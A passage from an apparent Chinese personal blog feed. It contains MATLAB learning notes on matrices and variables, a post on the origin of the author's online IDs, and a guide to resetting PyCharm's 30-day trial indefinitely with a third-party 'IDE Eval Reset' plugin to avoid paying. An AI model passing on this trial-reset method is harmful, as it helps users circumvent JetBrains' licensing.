class="number">65</span>    <span class="number">66</span>    <span class="number">67</span>    <span class="number">68</span>    <span class="number">69</span>    <span class="number">70</span>    <span class="number">71</span>    <span class="number">72</span>    <span class="number">73</span>    <span class="number">74</span>    <span class="number">75</span></span><br><span class="line"></span><br><span class="line">  列 <span class="number">76</span> 至 <span class="number">100</span></span><br><span class="line"></span><br><span class="line">    <span class="number">76</span>    <span class="number">77</span>    <span class="number">78</span>    <span class="number">79</span>    <span class="number">80</span>    <span class="number">81</span>    <span class="number">82</span>    <span class="number">83</span>    <span class="number">84</span>    <span class="number">85</span>    <span class="number">86</span>    <span class="number">87</span>    <span class="number">88</span>    <span class="number">89</span>    <span class="number">90</span>    <span class="number">91</span>    <span class="number">92</span>    <span class="number">93</span>    <span class="number">94</span>    <span class="number">95</span>    <span class="number">96</span>    <span class="number">97</span>    <span class="number">98</span>    <span class="number">99</span>   <span class="number">100</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>x=find(n)</code></p><p><code>find()</code>函数的功能是找到向量或者矩阵中不为0的元素</p><h4 id="典例：求-1-100-间的所有素数"><a href="#典例：求-1-100-间的所有素数" class="headerlink" title="典例：求[1,100]间的所有素数"></a>典例：求[1,100]间的所有素数</h4><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="number">1</span>:<span class="number">100</span>;</span><br><span class="line">k=<span class="built_in">isprime</span>(x);</span><br><span class="line">k1=<span class="built_in">find</span>(k);</span><br><span class="line">p=x(k1)</span><br><span class="line">p =</span><br><span class="line"></span><br><span class="line">  列 <span class="number">1</span> 至 <span class="number">24</span></span><br><span class="line"></span><br><span class="line">     <span class="number">2</span>     <span class="number">3</span>     <span class="number">5</span>     <span class="number">7</span>    <span class="number">11</span>    <span class="number">13</span>    <span class="number">17</span>    <span class="number">19</span>    <span class="number">23</span>    <span class="number">29</span>    <span class="number">31</span>    <span class="number">37</span>    <span class="number">41</span>    <span class="number">43</span>    <span class="number">47</span>    <span class="number">53</span>    <span class="number">59</span>    <span class="number">61</span>    <span class="number">67</span>    <span class="number">71</span>    <span class="number">73</span>    <span class="number">79</span>    <span class="number">83</span>    <span class="number">89</span></span><br><span class="line"></span><br><span class="line">  列 <span class="number">25</span></span><br><span class="line"></span><br><span class="line">    <span class="number">97</span></span><br></pre></td></tr></table></figure><blockquote><p>开始学习MATLAB了，因为上网不太方便所以部署应该是几天的笔记一起部署</p></blockquote><h2 id="变量及其操作"><a href="#变量及其操作" class="headerlink" title="变量及其操作"></a>变量及其操作</h2><p>变量命名：<strong>开头为字母</strong>（不能是下划线），可用字母、下划线、数字，长度最大为63字符，<strong>大小写敏感</strong></p><p>函数&#x2F;命令命名：遵循变量命名的同时要求全小写</p><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><p>最基础的直接用<code>变量名=表达式</code>即可，但是如果直接写<code>表达式</code>，那么就会直接赋给MATLAB的变量<code>ans</code>，如果在<code>变量名=表达式</code>后面加分号变成<code>变量名=表达式;</code>，那么则不会输出变量名的值</p><h3 id="默认赋值变量"><a href="#默认赋值变量" class="headerlink" title="默认赋值变量"></a>默认赋值变量</h3><p>变量名为<code>ans</code>，如果直接输入表达式，那么值会直接被赋值给<code>ans</code></p><h3 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h3><p><code>ans</code> 默认赋值变量</p><p><code>i</code> <code>j</code> 虚数单位</p><p><code>pi</code> 圆周率</p><p><code>NaN</code> 非数</p><h3 id="变量的管理"><a href="#变量的管理" class="headerlink" title="变量的管理"></a>变量的管理</h3><p>1、在工作区窗口可以对内存进行管理（删除和修改）</p><p>2、使用<code>who</code>或者<code>whos</code>可以看到变量（前者只显示名称，后者会给出大小、内容、类型等）</p><h3 id="变量的导出-x2F-导入"><a href="#变量的导出-x2F-导入" class="headerlink" title="变量的导出&#x2F;导入"></a>变量的导出&#x2F;导入</h3><p>文件格式为<code>.mat</code>，可以保存工作区变量</p><p>使用<code>save 文件名 变量名 ...</code>来保存变量、<code>load 文件名</code>来载入变量</p>]]></content>
      
      
      <categories>
          
          <category> MATLAB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MATLAB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MATLAB学习笔记 20211126</title>
      <link href="/posts/MATLAB20211126/"/>
      <url>/posts/MATLAB20211126/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><h3 id="矩阵的建立"><a href="#矩阵的建立" class="headerlink" title="矩阵的建立"></a>矩阵的建立</h3><p>用中括号括起来，按矩阵行的顺序输入各元素，同一行的用逗号<code>,</code>或者空格<code> </code>分割，不同行的用分号分割</p><p>例如：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>; <span class="number">4</span> <span class="number">5</span> <span class="number">6</span>; <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line">a =</span><br><span class="line"></span><br><span class="line">     <span class="number">1</span>     <span class="number">2</span>     <span class="number">3</span></span><br><span class="line">     <span class="number">4</span>     <span class="number">5</span>     <span class="number">6</span></span><br><span class="line">     <span class="number">7</span>     <span class="number">8</span>     <span class="number">9</span> </span><br></pre></td></tr></table></figure><p>矩阵可以利用已建好的矩阵来建立更大的矩阵，例如</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">A = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>; <span class="number">4</span> <span class="number">5</span> <span class="number">6</span>; <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>];</span><br><span class="line">B = [<span class="number">-1</span> <span class="number">-2</span> <span class="number">-3</span>; <span class="number">-4</span> <span class="number">-5</span> <span class="number">-6</span>; <span class="number">-7</span> <span class="number">-8</span> <span class="number">-9</span>];</span><br><span class="line">C = [A, B; B, A]</span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line">C =</span><br><span class="line"></span><br><span class="line">     <span class="number">1</span>     <span class="number">2</span>     <span class="number">3</span>    <span class="number">-1</span>    <span class="number">-2</span>    <span class="number">-3</span></span><br><span class="line">     <span class="number">4</span>     <span class="number">5</span>     <span class="number">6</span>    <span class="number">-4</span>    <span class="number">-5</span>    <span class="number">-6</span></span><br><span class="line">     <span class="number">7</span>     <span class="number">8</span>     <span class="number">9</span>    <span class="number">-7</span>    <span class="number">-8</span>    <span class="number">-9</span></span><br><span class="line">    <span class="number">-1</span>    <span class="number">-2</span>    <span class="number">-3</span>     <span class="number">1</span>     <span class="number">2</span>     <span class="number">3</span></span><br><span class="line">    <span class="number">-4</span>    <span class="number">-5</span>    <span class="number">-6</span>     <span class="number">4</span>     <span class="number">5</span>     <span class="number">6</span></span><br><span class="line">    <span class="number">-7</span>    <span class="number">-8</span>    <span class="number">-9</span>     <span class="number">7</span>     <span class="number">8</span>     <span class="number">9</span></span><br></pre></td></tr></table></figure><p>可以用实部矩阵和虚部矩阵构成虚部矩阵，例如</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">B = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>; <span class="number">4</span> <span class="number">5</span> <span class="number">6</span>];</span><br><span class="line">C = [<span class="number">6</span> <span class="number">7</span> <span class="number">8</span>; <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>];</span><br><span class="line">A = B + <span class="built_in">i</span> * C</span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line">A =</span><br><span class="line"></span><br><span class="line">   <span class="number">1.0000</span> + <span class="number">6.0000</span><span class="built_in">i</span>   <span class="number">2.0000</span> + <span class="number">7.0000</span><span class="built_in">i</span>   <span class="number">3.0000</span> + <span class="number">8.0000</span><span class="built_in">i</span></span><br><span class="line">   <span class="number">4.0000</span> + <span class="number">9.0000</span><span class="built_in">i</span>   <span class="number">5.0000</span> +<span class="number">10.0000</span><span class="built_in">i</span>   <span class="number">6.0000</span> +<span class="number">11.0000</span><span class="built_in">i</span></span><br></pre></td></tr></table></figure><h3 id="冒号表达式"><a href="#冒号表达式" class="headerlink" title="冒号表达式"></a>冒号表达式</h3><p>可以使用冒号表达式来建立行向量（矩阵的特殊类型）</p><p>格式为<code>e1:e2:e3</code>，<code>e1</code>为初始值，<code>e2</code>为步长，<code>e3</code>为终止值，跟Python的<code>range(Start, End, Step)</code>有点相似，只不过终止值和步长换了位置，在冒号表达式中，<code>e2</code>可以不写，那步长就默认为1，即<code>t = 0:1:5</code> &#x3D; <code>t = 0:5</code></p><p>例如：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="number">0</span>:<span class="number">1</span>:<span class="number">5</span></span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line">t =</span><br><span class="line"></span><br><span class="line">     <span class="number">0</span>     <span class="number">1</span>     <span class="number">2</span>     <span class="number">3</span>     <span class="number">4</span>     <span class="number">5</span></span><br></pre></td></tr></table></figure><h4 id="linspace函数"><a href="#linspace函数" class="headerlink" title="linspace函数"></a>linspace函数</h4><p>可以用于产生行向量，用法为<code>linspace(a,b,n)</code>，<code>a</code>是第一个元素，<code>b</code>是第二个元素,<code>n</code>是元素总数，当<code>n</code>省略时，其缺省值为100（跟<code>numpy</code>的<code>numpy.linspace(Start, End, Count)</code>用法一样，只不过<code>numpy</code>的缺省值是<code>50</code>）</p><h3 id="结构矩阵-struct"><a href="#结构矩阵-struct" class="headerlink" title="结构矩阵(struct)"></a>结构矩阵(struct)</h3><p>感觉有点类似制表，使用格式为<code>结构矩阵元素.成员名 = 表达式</code>，这里还是给出个例子</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a(<span class="number">1</span>).x1 = <span class="number">10</span>;a(<span class="number">1</span>).x2 = <span class="string">&#x27;liu&#x27;</span>; a(<span class="number">1</span>).x3 = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>];</span><br><span class="line">a(<span class="number">2</span>).x1 = <span class="number">20</span>;a(<span class="number">2</span>).x2 = <span class="string">&#x27;wang&#x27;</span>; a(<span class="number">2</span>).x3 = [<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>];</span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line">a = </span><br><span class="line"></span><br><span class="line">  包含以下字段的 <span class="number">1</span>×<span class="number">2</span> struct 数组:</span><br><span class="line"></span><br><span class="line">    x1</span><br><span class="line">    x2</span><br><span class="line">    x3</span><br></pre></td></tr></table></figure><p>在变量浏览器里面可以看到这个<code>a</code>变量长这样</p><table><thead><tr><th></th><th>x1</th><th>x2</th><th>x3</th></tr></thead><tbody><tr><td>1</td><td>10</td><td>‘liu’</td><td>[1,2,3]</td></tr><tr><td>2</td><td>20</td><td>‘wang’</td><td>[4,5,6]</td></tr></tbody></table><h3 id="单元矩阵"><a href="#单元矩阵" class="headerlink" title="单元矩阵"></a>单元矩阵</h3><p>建立方法：使用大括号<code>&#123;&#125;</code>将元素括起来，所有元素可以是不同类型的数据，例如：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">b = &#123;<span class="number">10</span> <span class="string">&#x27;liu&#x27;</span> [<span class="number">1</span> <span class="number">2</span> ; <span class="number">4</span> <span class="number">5</span>]; <span class="number">20</span>, <span class="string">&#x27;wang&#x27;</span> [<span class="number">6</span> <span class="number">7</span> ; <span class="number">9</span> <span class="number">10</span>]&#125;</span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line">b =</span><br><span class="line"></span><br><span class="line">  <span class="number">2</span>×<span class="number">3</span> cell 数组</span><br><span class="line"></span><br><span class="line">    &#123;[<span class="number">10</span>]&#125;    &#123;<span class="string">&#x27;liu&#x27;</span> &#125;    &#123;<span class="number">2</span>×<span class="number">2</span> double&#125;</span><br><span class="line">    &#123;[<span class="number">20</span>]&#125;    &#123;<span class="string">&#x27;wang&#x27;</span>&#125;    &#123;<span class="number">2</span>×<span class="number">2</span> double&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在变量浏览器里面可以看到<code>b</code>变量长这样（就是真正的表格了，没有<code>x1</code>,<code>x2</code>,<code>x3</code>这种头头索引）</p><table><thead><tr><th></th><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>1</td><td>10</td><td>‘liu’</td><td>[1,2;4,5]</td></tr><tr><td>2</td><td>20</td><td>‘wang’</td><td>[6,7;9,10]</td></tr></tbody></table><h2 id="矩阵元素的使用"><a href="#矩阵元素的使用" class="headerlink" title="矩阵元素的使用"></a>矩阵元素的使用</h2><h3 id="引用方式"><a href="#引用方式" class="headerlink" title="引用方式"></a>引用方式</h3><h4 id="下标法"><a href="#下标法" class="headerlink" title="下标法"></a>下标法</h4><p>使用变量名(位置)来索引，例如：</p><p><code>A(3,2)</code>表示A矩阵第<code>3</code>行第<code>2</code>列的位置，同样可以通过该方式修改矩阵中的元素，例如：</p><p><code>A(3,2) = 100</code>就是将A矩阵第<code>3</code>行第<code>2</code>列的元素修改为100</p><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">A = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>; <span class="number">4</span> <span class="number">5</span> <span class="number">6</span>];</span><br><span class="line">A(<span class="number">5</span>,<span class="number">5</span>) = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">A =</span><br><span class="line"></span><br><span class="line">     <span class="number">1</span>     <span class="number">2</span>     <span class="number">3</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">4</span>     <span class="number">5</span>     <span class="number">6</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span>    <span class="number">10</span></span><br></pre></td></tr></table></figure><p>当给出的行和列的下表超出了矩阵的行数和列数，那将会自动扩展原来的矩阵并将为赋值元素自动赋值为<code>0</code></p><h4 id="序号法"><a href="#序号法" class="headerlink" title="序号法"></a>序号法</h4><p>序号就是元素在矩阵的排列顺序，存储顺序是<em><strong>第一列-&gt;最后一列</strong></em>（不是我们习惯性的行），例如：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>; <span class="number">4</span> <span class="number">5</span> <span class="number">6</span>];</span><br><span class="line">A(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line"></span><br><span class="line">     <span class="number">2</span></span><br></pre></td></tr></table></figure><p>序号与下标是一一对应的，以<code>m*n</code>矩阵<code>A</code>为例，矩阵<code>A(i,j)</code>的序号是<code>(j-1)*m+i</code></p><p><strong>矩阵元素的序号和下标可以通过<code>sub2ind</code>（行列换序号）和<code>ind2sub</code>（序号换行列）函数进行相互转换</strong></p><p><strong>调用格式：</strong></p><p><strong><code>D=sub2ind(S,I,J)</code>，<code>S</code>表示由矩阵的行数和列数组成的向量，一般用<code>size(变量名)</code>来获取；<code>I</code>表示转换矩阵元素的行下标，<code>J</code>表示转换矩阵元素的列下标。若<code>I</code>和<code>J</code>为矩阵的话，会将多个元素的下表转换为序号，此时<code>I</code>和<code>J</code>的行列数必须相同</strong></p><p><strong><code>[I,J]=ind2sub(S,D)</code>，<code>S</code>表示行数和列数组成的向量，<code>D</code>表示序号，返回序号所对应的行下标和列下表，<code>I</code>为行下标，<code>J</code>为列下标</strong></p><h3 id="冒号表达式-1"><a href="#冒号表达式-1" class="headerlink" title="冒号表达式"></a>冒号表达式</h3><p>这一节以下面的几个例子展开：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A(<span class="built_in">i</span>,:)<span class="comment">% 第i行的全部元素</span></span><br><span class="line">A(:,<span class="built_in">j</span>)<span class="comment">% 第j列的全部元素</span></span><br><span class="line">A(<span class="built_in">i</span>:<span class="built_in">i</span>+m,k:k+m)<span class="comment">% 第i~i+m行内且在第k~k+m列中的所有元素</span></span><br><span class="line">A(iLi+m,:)<span class="comment">% 第i~i+m行的全部元素</span></span><br></pre></td></tr></table></figure><p>从上面看，个人认为有点像Python的列表切片那种东西，只不过这里是二维的而且是全闭区间，Python的是半开半闭区间</p><p>可以使用<code>end</code>来表示某一位的末尾元素下标，例如：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>; <span class="number">4</span> <span class="number">5</span> <span class="number">6</span>; <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>];</span><br><span class="line">A(<span class="keyword">end</span>,:)</span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line"></span><br><span class="line">     <span class="number">7</span>     <span class="number">8</span>     <span class="number">9</span></span><br></pre></td></tr></table></figure><p>此处的<code>end</code>就是第三行，也就是说<code>end</code>会取到行&#x2F;列的最大值</p><h3 id="删除矩阵元素"><a href="#删除矩阵元素" class="headerlink" title="删除矩阵元素"></a>删除矩阵元素</h3><h4 id="利用空矩阵删除矩阵的元素"><a href="#利用空矩阵删除矩阵的元素" class="headerlink" title="利用空矩阵删除矩阵的元素"></a>利用空矩阵删除矩阵的元素</h4><p>若<code>x</code>为非空矩阵，此时想删除<code>x</code>中的内容，则直接使用<code>x = []</code>就可以删除元素了</p><p>可以跟冒号表达式一起使用删除大矩阵中的部分元素</p><h3 id="改变矩阵的形状"><a href="#改变矩阵的形状" class="headerlink" title="改变矩阵的形状"></a>改变矩阵的形状</h3><p>利用函数<code>reshape(A,m,n)</code>，表示在矩阵<code>A</code>保持不变的情况下，将<code>A</code>排列为<code>m*n</code>的二维矩阵，<strong>但是不改变元素个数和存储顺序</strong>，举例：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span>];</span><br><span class="line">y = <span class="built_in">reshape</span>(x,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line">y =</span><br><span class="line"></span><br><span class="line">     <span class="number">1</span>     <span class="number">4</span>     <span class="number">7</span>    <span class="number">10</span></span><br><span class="line">     <span class="number">2</span>     <span class="number">5</span>     <span class="number">8</span>    <span class="number">11</span></span><br><span class="line">     <span class="number">3</span>     <span class="number">6</span>     <span class="number">9</span>    <span class="number">12</span></span><br></pre></td></tr></table></figure><p>特殊的表达方式<code>A(:)</code>将A的每一列元素堆叠起来，成为一个列向量，例如：（此处的<code>x</code>与上面的一样）</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">z = x(:)</span><br><span class="line"></span><br><span class="line">[output]</span><br><span class="line">z =</span><br><span class="line"></span><br><span class="line">     <span class="number">1</span></span><br><span class="line">     <span class="number">2</span></span><br><span class="line">     <span class="number">3</span></span><br><span class="line">     <span class="number">4</span></span><br><span class="line">     <span class="number">5</span></span><br><span class="line">     <span class="number">6</span></span><br><span class="line">     <span class="number">7</span></span><br><span class="line">     <span class="number">8</span></span><br><span class="line">     <span class="number">9</span></span><br><span class="line">    <span class="number">10</span></span><br><span class="line">    <span class="number">11</span></span><br><span class="line">    <span class="number">12</span></span><br></pre></td></tr></table></figure><p>这样<code>z</code>就是用<code>x</code>中的元素堆叠成的列</p>]]></content>
      
      
      <categories>
          
          <category> MATLAB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MATLAB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pycharm无限使用记录</title>
      <link href="/posts/Pycharm-Unlimited-Evaluate/"/>
      <url>/posts/Pycharm-Unlimited-Evaluate/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Pycharm是个老牌的PY编辑器了，但是一直都没用它因为它收费而且社区版少很多功能。这不别人又给我推荐了一下它，作为老白嫖怪（花钱是不可能花钱的这辈子都不可能的）当然是要找办法来搞定它的激活的。</p><p>一开始我是找的激活码，但是我发现这软件的激活码没那么简单，后来就找到了下面的方法</p><p>（PS：理论上此方法适用于所有的JetBrains软件）</p><p>首先我们要安装一个Pycharm（这不是废话嘛），这边建议从官方下载不要走C&amp;J。官方下载链接在这里：<a href="https://www.jetbrains.com/pycharm/">https://www.jetbrains.com/pycharm/</a></p><p>然后我们打开Pycharm，选择Evaluate，也就是评估，进入30天的试用期</p><p>在顶上找到File，点击Settings</p><p><img src="https://user-images.githubusercontent.com/28426291/130939321-a667328b-5995-448e-a064-17016bdc3f19.png"></p><p>然后在左边找到Plugins，点击上面的小齿轮，选择Manage这一项</p><p><img src="https://user-images.githubusercontent.com/28426291/130939573-245008de-c03f-4232-99fc-c8c4b519e11c.png"></p><p>然后在窗口点击+号，加入<code>https://plugins.zhile.io</code>这一项</p><p><img src="https://user-images.githubusercontent.com/28426291/130939522-a67c0c4e-d62d-43c8-b602-df10ad15b378.png"></p><p>返回，搜索<code>IDE Eval Reset</code>，并安装，然后重启你的Pycharm</p><p>重启以后，你能在Help选项卡下找到<code>Eval Reset</code>选项</p><p><img src="https://user-images.githubusercontent.com/28426291/130944060-f695ccc4-b423-4f1e-8490-ff99c47a3f79.png"></p><p>把<code>Auto reset before per restart</code>点上，点击右边的<code>Reset</code>，就会被重置为30天试用期了</p><hr><p>本文结束！说点别的，因为我所去到的大学对网络、设备有着严格的要求，所以我可能长达一年都不会更新，请大家谅解！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常吐槽10：为什么我叫做&quot;GamerNoTitle&quot;？</title>
      <link href="/posts/ID-History/"/>
      <url>/posts/ID-History/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>总有人问我：为啥你叫XXX呀？那么我今天就来告诉你们我的这些ID都是怎么来的</p><p>（每个ID的故事用一个标题分割，可以在目录中快速找到）</p><h3 id="bilibiliMeowMiku"><a href="#bilibiliMeowMiku" class="headerlink" title="bilibiliMeowMiku"></a>bilibiliMeowMiku</h3><p>这个主要是因为最开始我在玩CODOL（tx打钱）的时候，本来我在华东大区，当时因为活动挤不进去，当时我本来也就是为了活动上线的，既然挤不进去我也没办法，然后我同学（小学的）就说其他区也可以，但是我其他区没创号，然后就要起ID。我当时很烦恼，本来也就不擅长这种事情，然后我同学说：“那你就叫‘喵呜初音’吧！”然后我也很老实地打了上去，从此以后就出现了<strong>喵呜初音</strong>这个ID，我所有的国内的软件、游戏的ID都是这个。因为B站也写的这个，而外面的游戏和网站要求的用户名不能用中文，然后就用<strong>MeowMiku</strong>，但是这个ID早就被注册了，所以前面加上<strong>bilibili</strong>就变成了<strong>bilibiliMeowMiku</strong></p><h3 id="FutureCode"><a href="#FutureCode" class="headerlink" title="FutureCode"></a>FutureCode</h3><p>这个主要是用惯了上面的ID发现太长了，然后就想换一个ID。当时B站在微软商店的公司名称是<strong>上海未来代码科技有限公司</strong>，然后我就把<strong>未来代码</strong>拿下来用变成了<strong>FutureCode</strong>，然后就用上了</p><h3 id="FutureCompile"><a href="#FutureCompile" class="headerlink" title="FutureCompile"></a>FutureCompile</h3><p>这个是因为<strong>FutureCode</strong>太多人用了导致重名，就把<strong>Code</strong>改成了<strong>Compile</strong>（编译）</p><h3 id="Gamer-bili"><a href="#Gamer-bili" class="headerlink" title="Gamer.bili"></a>Gamer.bili</h3><p>这个是我在高一的时候开始用的，因为当时一直在玩游戏，所以感觉给自己冠以<strong>Gamer</strong>的头衔好像没什么问题，然后还是出于对B站的热爱，就在点后面加了<strong>bili</strong>的字样</p><h3 id="GamerNoTitle"><a href="#GamerNoTitle" class="headerlink" title="GamerNoTitle"></a>GamerNoTitle</h3><p>这个是从<strong>Gamer.bili</strong>变过来的，当时很喜欢听一首歌叫做<strong>NoTitle</strong>（放在这行的下面）</p>        <div id="aplayer-JKSpRiDw" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-JKSpRiDw"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "No Title",              author: "ShakingHigh / Reol / 初音ミク",              url: "https://music.163.com/song/media/outer/url?id=467787951.mp3",              pic: "http://p1.music.126.net/nikAUaRMtm6-ekcgqMt7eA==/109951162884628615.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><p>然后就把<strong>bili</strong>改成了<strong>NoTitle</strong>，成了我最常用的ID</p><h3 id="更多ID？"><a href="#更多ID？" class="headerlink" title="更多ID？"></a>更多ID？</h3><p>以后再更……</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>音灵INVAXION解锁工具制作全纪录</title>
      <link href="/posts/INVAXION-Unlock-Log/"/>
      <url>/posts/INVAXION-Unlock-Log/</url>
      
